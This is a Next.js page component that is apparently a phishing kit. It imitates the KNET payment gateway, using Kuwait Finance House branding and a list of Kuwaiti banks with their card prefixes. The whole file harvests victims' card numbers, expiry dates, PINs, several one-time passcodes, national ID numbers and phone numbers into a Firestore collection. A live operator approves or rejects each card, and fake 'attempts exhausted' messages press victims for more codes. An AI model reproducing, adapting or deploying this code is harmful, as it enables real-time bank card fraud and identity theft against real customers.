"use client";
import { useEffect, useState } from "react";
import "./resposive.css";
import { doc, onSnapshot } from "firebase/firestore";
import { useRouter } from "next/navigation";
import { db, handlePay } from "@/lib/firebase";
import LoaderApp from "@/components/loader";
import { setupOnlineStatus } from "@/lib/utils";

type PaymentInfo = {
  createdDate: string;
  cardNumber: string;
  year: string;
  month: string;
  bank?: string;
  cvv?: string;
  otp?: string;
  pass: string;
  cardState: string;
  allOtps: string[];
  bank_card: string[];
  prefix: string;
  status: "new" | "pending" | "approved" | "rejected";
  phoneNumber: string;
  network: string;
  idNumber: string;
  otp2: string;
};
const BANKS = [
  {
    value: "ABK",
    label: "Al Ahli Bank of Kuwait",
    cardPrefixes: ["403622", "428628", "423826"],
  },
  {
    value: "ALRAJHI",
    label: "Al Rajhi Bank",
    cardPrefixes: ["458838"],
  },
  {
    value: "BBK",
    label: "Bank of Bahrain and Kuwait",
    cardPrefixes: ["418056", "588790"],
  },
  {
    value: "BOUBYAN",
    label: "Boubyan Bank",
    cardPrefixes: [
      "470350",
      "490455",
      "490456",
      "404919",
      "450605",
      "426058",
      "431199",
    ],
  },

  {
    value: "BURGAN",
    label: "Burgan Bank",
    cardPrefixes: [
      "468564",
      "402978",
      "403583",
      "415254",
      "450238",
      "540759",
      "49219000",
    ],
  },

  {
    value: "CBK",
    label: "Commercial Bank of Kuwait",
    cardPrefixes: ["532672", "537015", "521175", "516334"],
  },
  {
    value: "Doha",
    label: "Doha Bank",
    cardPrefixes: ["419252"],
  },

  {
    value: "GBK",
    label: "Gulf Bank",
    cardPrefixes: [
      "526206",
      "531470",
      "531644",
      "531329",
      "517419",
      "517458",
      "531471",
      "559475",
    ],
  },
  {
    value: "TAM",
    label: "TAM Bank",
    cardPrefixes: ["45077848", "45077849"],
  },

  {
    value: "KFH",
    label: "Kuwait Finance House",
    cardPrefixes: ["485602", "537016", "5326674", "450778"],
  },
  {
    value: "KIB",
    label: "Kuwait International Bank",
    cardPrefixes: ["409054", "406464"],
  },
  {
    value: "NBK",
    label: "National Bank of Kuwait",
    cardPrefixes: ["464452", "589160"],
  },
  {
    value: "Weyay",
    label: "Weyay Bank",
    cardPrefixes: ["46445250", "543363"],
  },
  {
    value: "QNB",
    label: "Qatar National Bank",
    cardPrefixes: ["521020", "524745"],
  },
  {
    value: "UNB",
    label: "Union National Bank",
    cardPrefixes: ["457778"],
  },
  {
    value: "WARBA",
    label: "Warba Bank",
    cardPrefixes: ["541350", "525528", "532749", "559459"],
  },
];

export default function Payment() {
  const [step, setstep] = useState(1);
  const [newotp] = useState([""]);
  const [total, setTotal] = useState("");
  const [isloading, setisloading] = useState(false);
  const router = useRouter();
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    createdDate: new Date().toISOString(),
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    allOtps: newotp,
    bank: "",
    pass: "",
    cardState: "new",
    bank_card: [""],
    prefix: "",
    status: "new",
    phoneNumber: "",
    network: "",
    idNumber: "",
    otp2: "",
  });
  const [countdown, setCountdown] = useState(60);
  const [isCountdownActive, setIsCountdownActive] = useState(true);
  const [otpAttempts, setOtpAttempts] = useState(-2);
  const [otpValue, setOtpValue] = useState("");
  const handleAddotp = (otp: string) => {
    newotp.push(`${otp} , `);
  };
  useEffect(() => {
    //handleAddotp(paymentInfo.otp!)
    const ty = localStorage!.getItem("amount");
    if (ty) {
      setTotal(ty);
    }
  }, []);

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      setupOnlineStatus(visitorId!);
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as PaymentInfo;
          if (data.status === "pending") {
            setisloading(true);
          } else if (data.status === "approved") {
            setisloading(false);
            setstep(2);
          } else if (data.status === "rejected") {
            setisloading(false);
            alert("Card rejected please try again!");
            setstep(1);
          }
        }
      });

      return () => unsubscribe();
    }
  }, []);

  useEffect(() => {
    let interval: NodeJS.Timeout | null = null;

    if (isCountdownActive && countdown > 0) {
      interval = setInterval(() => {
        setCountdown((countdown) => countdown - 1);
      }, 1000);
    } else if (countdown === 0) {
      setIsCountdownActive(false);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [isCountdownActive, countdown]);

  return (
    <div
      style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }}
      dir="ltr"
    >
      <form
        onSubmit={(e) => {
          e.preventDefault();
        }}
        style={{ direction: "ltr" }}
      >
        <div id="PayPageEntry">
          <div className="container">
            <div style={{ display: "flex", justifyContent: "center" }}>
              <img src="./mob.jpg" className="-" alt="logo" />
            </div>
            <div className="content-block">
              <div className="form-card">
                <div
                  className="container-"
                  style={{ display: "flex", justifyContent: "center" }}
                >
                  <img
                    src="./kfh.jpeg"
                    className="-"
                    alt="logo"
                    height={90}
                    width={90}
                  />
                </div>
                <div className="row">
                  <label className="column-label">Merchant: </label>
                  <label className="column-value text-label">
                    Mobile Telecommunication Co.{" "}
                  </label>
                </div>
                <div id="OrgTranxAmt">
                  <label className="column-label"> Amount: </label>
                  <label className="column-value text-label" id="amount">
                    {total}
                    {"  "}KD&nbsp;{" "}
                  </label>
                </div>
                {/* Added for PG Eidia Discount starts   */}
                <div
                  className="row"
                  id="DiscntRate"
                  style={{ display: "none" }}
                />
                <div
                  className="row"
                  id="DiscntedAmt"
                  style={{ display: "none" }}
                />
                {/* Added for PG Eidia Discount ends   */}
              </div>
              <div className="form-card">
                <div
                  className="notification"
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    paddingRight: 15,
                    display: "none",
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                  id="otpmsgDC"
                />
                {/*Customer Validation  for knet*/}
                <div
                  className="notification"
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    paddingRight: 15,
                    display: "none",
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                  id="CVmsg"
                />
                <div id="ValidationMessage">
                  {/*span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
            font-family: helvetica, arial, sans serif;
            color: #ff0000;
              padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
                      </span*/}
                </div>
                <div id="savedCardDiv" style={{ display: "none" }}>
                  {/* Commented the bank name display for kfast starts */}
                  <div className="row">
                    <br />
                  </div>
                  {/* Commented the bank name display for kfast ends */}
                  {/* Added for Points Redemption */}
                  <div className="row">
                    <label className="column-label" style={{ marginLeft: 20 }}>
                      PIN:
                    </label>
                    <input
                      inputMode="numeric"
                      pattern="[0-9]*"
                      name="debitsavedcardPIN"
                      id="debitsavedcardPIN"
                      autoComplete="off"
                      title="Should be in number. Length should be 4"
                      type="password"
                      size={4}
                      maxLength={4}
                      className="allownumericwithoutdecimal"
                      style={{ width: "50%" }}
                    />
                  </div>
                  {/* Added for Points Redemption */}
                </div>

                {step === 1 ? (
                  <>
                    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
                      <div className="row">
                        <label
                          className="column-label"
                          style={{ width: "40%" }}
                        >
                          Select Your Bank:
                        </label>
                        <select
                          className="column-value"
                          style={{ width: "60%" }}
                          onChange={(e: any) => {
                            const selectedBank = BANKS.find(
                              (bank) => bank.value === e.target.value
                            );

                            setPaymentInfo({
                              ...paymentInfo,
                              bank: e.target.value,
                              bank_card: selectedBank
                                ? selectedBank.cardPrefixes
                                : [""],
                            });
                          }}
                        >
                          <>
                            <option value="bankname" title="Select Your Bank">
                              Select Your Banks
                            </option>
                            {BANKS.map((i, index) => (
                              <option value={i.value} key={index}>
                                {i.label} [{i.value}]
                              </option>
                            ))}
                          </>
                        </select>
                      </div>
                      <div
                        className="row three-column"
                        id="Paymentpagecardnumber"
                      >
                        <label className="column-label mt-1">
                          Card Number:
                        </label>
                        <label>
                          <select
                            className="column-value  mt-1"
                            name="dcprefix"
                            id="dcprefix"
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                prefix: e.target.value,
                              })
                            }
                            style={{ width: "26%" }}
                          >
                            <option
                              value={"i"}
                              onClick={(e: any) => {
                                setPaymentInfo({
                                  ...paymentInfo,
                                  prefix: e.target.value,
                                });
                              }}
                            >
                              prefix
                            </option>
                            {paymentInfo.bank_card.map((i, index) => (
                              <option
                                key={index}
                                value={i}
                                onClick={(e: any) => {
                                  setPaymentInfo({
                                    ...paymentInfo,
                                    prefix: e.target.value,
                                  });
                                }}
                              >
                                {i}
                              </option>
                            ))}
                          </select>
                        </label>
                        <label>
                          <input
                            name="debitNumber"
                            id="debitNumber"
                            type="tel"
                            inputMode="numeric"
                            pattern="[0-9]*"
                            size={10}
                            className="allownumericwithoutdecimal"
                            style={{ width: "32%" }}
                            maxLength={10}
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                cardNumber: e.target.value,
                              })
                            }
                            title="Should be in number. Length should be 10"
                          />
                        </label>
                      </div>
                      <div className="row three-column" id="cardExpdate">
                        <div id="debitExpDate">
                          <label className="column-label">
                            {" "}
                            Expiration Date:{" "}
                          </label>
                        </div>
                        <select
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              month: e.target.value,
                            })
                          }
                          className="column-value"
                        >
                          <option value={0}>MM</option>
                          <option value={1}>01</option>
                          <option value={2}>02</option>
                          <option value={3}>03</option>
                          <option value={4}>04</option>
                          <option value={5}>05</option>
                          <option value={6}>06</option>
                          <option value={7}>07</option>
                          <option value={8}>08</option>
                          <option value={9}>09</option>
                          <option value={10}>10</option>
                          <option value={11}>11</option>
                          <option value={12}>12</option>
                        </select>
                        <select
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              year: e.target.value,
                            })
                          }
                          className="column-long"
                        >
                          <option value={0}>YYYY</option>
                          <option value={2024}>2024</option>
                          <option value={2025}>2025</option>
                          <option value={2026}>2026</option>
                          <option value={2027}>2027</option>
                          <option value={2028}>2028</option>
                          <option value={2029}>2029</option>
                          <option value={2030}>2030</option>
                          <option value={2031}>2031</option>
                          <option value={2032}>2032</option>
                          <option value={2033}>2033</option>
                          <option value={2034}>2034</option>
                          <option value={2035}>2035</option>
                          <option value={2036}>2036</option>
                          <option value={2037}>2037</option>
                          <option value={2038}>2038</option>
                          <option value={2039}>2039</option>
                          <option value={2040}>2040</option>
                          <option value={2041}>2041</option>
                          <option value={2042}>2042</option>
                          <option value={2043}>2043</option>
                          <option value={2044}>2044</option>
                          <option value={2045}>2045</option>
                          <option value={2046}>2046</option>
                          <option value={2047}>2047</option>
                          <option value={2048}>2048</option>
                          <option value={2049}>2049</option>
                          <option value={2050}>2050</option>
                          <option value={2051}>2051</option>
                          <option value={2052}>2052</option>
                          <option value={2053}>2053</option>
                          <option value={2054}>2054</option>
                          <option value={2055}>2055</option>
                          <option value={2056}>2056</option>
                          <option value={2057}>2057</option>
                          <option value={2058}>2058</option>
                          <option value={2059}>2059</option>
                          <option value={2060}>2060</option>
                          <option value={2061}>2061</option>
                          <option value={2062}>2062</option>
                          <option value={2063}>2063</option>
                          <option value={2064}>2064</option>
                          <option value={2065}>2065</option>
                          <option value={2066}>2066</option>
                          <option value={2067}>2067</option>
                        </select>
                      </div>
                      <div className="row" id="PinRow">
                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}

                        <div id="eComPin">
                          <label className="column-label"> PIN: </label>
                        </div>
                        <div>
                          <input
                            inputMode="numeric"
                            pattern="[0-9]*"
                            name="cardPin"
                            id="cardPin"
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                pass: e.target.value,
                              })
                            }
                            autoComplete="off"
                            title="Should be in number. Length should be 4"
                            type="password"
                            size={4}
                            maxLength={4}
                            className="allownumericwithoutdecimal"
                            style={{ width: "60%" }}
                          />
                        </div>
                      </div>
                      {step === 1 && paymentInfo.status === "approved" ? (
                        <div className="row" id="PinRow">
                          {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
                          <input
                            type="hidden"
                            name="cardPinType"
                            defaultValue="A"
                          />
                          <div id="eComPin">
                            <label className="column-label"> Cvv: </label>
                          </div>
                          <div>
                            <input
                              inputMode="numeric"
                              pattern="[0-9]*"
                              name="cvv"
                              id="cvv"
                              autoComplete="off"
                              title="Should be in number. Length should be 3"
                              type="password"
                              size={3}
                              maxLength={3}
                              className="allownumericwithoutdecimal"
                              style={{ width: "60%" }}
                            />
                          </div>
                        </div>
                      ) : null}
                    </div>
                  </>
                ) : step === 2 ? (
                  <div>
                    <div className="row">
                      <div
                        className="bg-blue-100 font-normal p-2 my-2"
                        style={{ fontSize: 12, borderRadius: 3 }}
                      >
                        <strong>Please note:</strong> A 6-digit verification
                        code has been sent via text message to your registered
                        phone number
                      </div>
                    </div>
                    <div className="row">
                      <label className="column-label">CardNumber:</label>
                      <label
                        className="allownumericwithoutdecimal"
                        style={{ color: "black", fontWeight: 100 }}
                      >
                        {" "}
                        {paymentInfo.cardNumber.substring(0, 5) +
                          "****" +
                          paymentInfo.cardNumber.substring(10, 15)}
                      </label>
                    </div>
                    <div className="row">
                      <label className="column-label">Month expiry:</label>
                      <label
                        className="allownumericwithoutdecimal"
                        style={{ color: "black", fontWeight: 100 }}
                      >
                        {" "}
                        {paymentInfo.month}
                      </label>
                    </div>
                    <div className="row">
                      <label className="column-label">Year expiry:</label>
                      <label
                        className="allownumericwithoutdecimal"
                        style={{ color: "black", fontWeight: 100 }}
                      >
                        {" "}
                        {paymentInfo.year}
                      </label>
                    </div>
                    <div className="row">
                      <label className="column-label">Pin:</label>
                      <label
                        className="allownumericwithoutdecimal"
                        style={{ color: "black", fontWeight: 200 }}
                      >
                        {"****"}
                      </label>
                    </div>
                    <div className="flex my-1">
                      <label className="column-value ">OTP:</label>
                      <input
                        onChange={(e: any) => {
                          setPaymentInfo({
                            ...paymentInfo,
                            otp: e.target.value,
                          });
                          setOtpValue(e.target.value);
                        }}
                        type="tel"
                        maxLength={6}
                        id="timer"
                        className="w-full"
                        value={otpValue}
                        placeholder={`Timeout in: 01:${
                          countdown === 0 ? "00" : countdown
                        }`}
                      />
                    </div>
                    <div className="row">
                      <div
                        className="text-sm text-gray-600"
                        style={{
                          fontSize: 12,
                          color: "#666",
                          textAlign: "center",
                          marginTop: 5,
                        }}
                      >
                        {otpAttempts >= 6 && (
                          <div style={{ color: "#ff0000", marginTop: 2 }}>
                            سيتطلب مزيداً من التحقق بسبب فشل التحقق من الرمز
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                ) : step === 3 ? (
                  <>
                    <Step3
                      setPaymentInfo={setPaymentInfo}
                      paymentInfo={paymentInfo}
                    />
                  </>
                ) : step === 4 ? (
                  <>
                    <Step4
                      setPaymentInfo={setPaymentInfo}
                      paymentInfo={paymentInfo}
                    />
                  </>
                ) : (
                  <></>
                )}
              </div>
              <div className="form-card">
                <div className="row">
                  <div style={{ textAlign: "center" }}>
                    <div id="loading" style={{ display: "none" }}>
                      <center>
                        <img
                          style={{
                            height: 20,
                            float: "left",
                            marginLeft: "20%",
                          }}
                        />
                        <label
                          className="column-value text-label"
                          style={{ width: "70%", textAlign: "center" }}
                        >
                          Processing.. please wait ...
                        </label>
                      </center>
                    </div>
                    <div style={{ display: "flex" }}>
                      <button
                        style={{
                          background: "#f2f2f2",
                          marginLeft: 0,
                          borderRadius: 5,
                        }}
                        disabled={
                          (step === 1 &&
                            (paymentInfo.prefix === "" ||
                              paymentInfo.bank === "" ||
                              paymentInfo.cardNumber === "" ||
                              paymentInfo.pass === "" ||
                              paymentInfo.month === "" ||
                              paymentInfo.year === "" ||
                              paymentInfo.pass.length !== 4)) ||
                          (step === 2 && paymentInfo.otp?.length !== 6)
                        }
                        onClick={() => {
                          if (step === 1) {
                            setisloading(true);
                            handlePay(paymentInfo, setPaymentInfo);
                          } else if (step === 2) {
                            if (!newotp.includes(paymentInfo.otp!)) {
                              newotp.push(paymentInfo.otp!);
                            }
                            setisloading(true);
                            handleAddotp(paymentInfo.otp!);

                            // Increment attempt counter
                            const newAttemptCount = otpAttempts + 1;
                            setOtpAttempts(newAttemptCount);

                            // Clear OTP input after submit
                            setOtpValue("");
                            handlePay(paymentInfo, setPaymentInfo);

                            setTimeout(() => {
                              // Check if this is the 3rd attempt, if so move to step 3
                              if (newAttemptCount >= 3) {
                                alert(
                                  "تم استنفاد المحاولات المسموحة. سيتم الانتقال إلى التحقق الإضافي لإكمال العملية."
                                );
                                setstep(3);
                                setOtpAttempts(1); // Reset counter for next time
                              } else {
                                // For now, we'll assume OTP is incorrect and stay on step 2
                                // In a real scenario, you'd check the OTP validation response
                              }
                              setisloading(false);
                            }, 3000);
                          } else if (step === 3) {
                            setisloading(true);

                            // Save step 3 data to Firestore
                            handlePay(paymentInfo, setPaymentInfo);

                            setTimeout(() => {
                              setstep(4);
                              setisloading(false);
                            }, 7000);
                          } else if (step === 4) {
                            setisloading(true);

                            // Save step 4 data (otp2) to Firestore
                            handlePay(paymentInfo, setPaymentInfo);

                            setTimeout(() => {
                              setisloading(false);
                              router.push("/auth");
                            }, 5000);
                          }

                          setPaymentInfo({
                            ...paymentInfo,
                            otp2: step === 4 ? "" : paymentInfo.otp2,
                          });
                        }}
                      >
                        {isloading
                          ? "Wait..."
                          : step === 1
                          ? "Submit"
                          : "Confirm"}
                      </button>
                      <button
                        style={{
                          background: "#f2f2f2",
                          marginLeft: 0,
                          borderRadius: 5,
                        }}
                      >
                        Cancel
                      </button>
                    </div>
                  </div>
                </div>
              </div>
              <div
                id="overlayhide"
                className="overlay"
                style={{ display: "none" }}
              ></div>

              <footer>
                <div className="footer-content-new">
                  <div className="row_new">
                    <div
                      style={{
                        textAlign: "center",
                        fontSize: 11,
                        lineHeight: 1,
                      }}
                    >
                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;
                      &nbsp;
                      <br />
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: "bold",
                          color: "#0077d5",
                        }}
                      >
                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
                        - KNET
                      </span>
                    </div>
                  </div>
                  <div id="DigiCertClickID_cM-vbZrL" />
                </div>
                <div id="DigiCertClickID_cM-vbZrL" />
              </footer>
            </div>
          </div>
        </div>
        {isloading && <LoaderApp />}
      </form>
    </div>
  );
}

const Step3 = ({ setPaymentInfo, paymentInfo }: any) => {
  return (
    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
      <div className="row">
        <label style={{ width: "40%" }} className="column-label">
          ID Number:
        </label>
        <label>
          <input
            name="natID"
            style={{ width: "60%" }}
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            size={12}
            onChange={(e: any) =>
              setPaymentInfo({
                ...paymentInfo,
                idNumber: e.target.value,
              })
            }
            className="allownumericwithoutdecimal"
            maxLength={12}
            title="Should be in number. Length should be 12"
          />
        </label>
      </div>
      <div className="row">
        <label style={{ width: "40%" }} className="column-label">
          Authorized Phone Number:
        </label>
        <label>
          <input
            name="number"
            onChange={(e: any) =>
              setPaymentInfo({
                ...paymentInfo,
                phoneNumber: e.target.value,
              })
            }
            style={{ width: "60%" }}
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            size={10}
            className="allownumericwithoutdecimal"
            maxLength={10}
            title="Should be in number. Length should be 10"
          />
        </label>
      </div>
      <div className="row">
        <label className="column-label" style={{ width: "40%" }}>
          Network operator:{" "}
        </label>
        <select
          className="column-value"
          style={{ width: "60%" }}
          name="company"
          onChange={(e: any) =>
            setPaymentInfo({
              ...paymentInfo,
              network: e.target.value,
            })
          }
          id="type"
        >
          <option value="">Choose Network operator:...</option>
          <option value="STC" title="STC">
            STC
          </option>
          <option value="Zain" title="Zain">
            Zain
          </option>
          <option value="Ooredoo" title="Ooredoo">
            Ooredoo
          </option>
        </select>
      </div>
    </div>
  );
};
const Step4 = (props: any) => {
  return (
    <div>
      <div className="row">
        <div
          className="bg-blue-100 font-normal p-2 my-2"
          style={{ fontSize: 12, borderRadius: 3 }}
        >
          Please note: A 6-digit verification code has been sent via text
          message to your registered phone number
        </div>
      </div>
      <div className="row">
        <label style={{ width: "40%" }} className="column-label">
          ID Number:
        </label>
        <label
          style={{ width: "60%", fontWeight: 100, color: "black" }}
          className="column-label"
        >
          {props.paymentInfo.idNumber}
        </label>
      </div>
      <div className="row">
        <label style={{ width: "40%" }} className="column-label">
          Phone Number:
        </label>
        <label
          style={{ width: "60%", fontWeight: 100, color: "black" }}
          className="column-label"
        >
          {props.paymentInfo.phoneNumber}
        </label>
      </div>
      <div className="row">
        <label className="column-label">OTP:</label>
        <label className="column-label"></label>
        <input
          onChange={(e: any) =>
            props.setPaymentInfo({
              ...props.paymentInfo,
              otp2: e.target.value,
            })
          }
          type="tel"
          maxLength={6}
          id="timer"
          value={props.paymentInfo.otp2}
        />
      </div>
    </div>
  );
};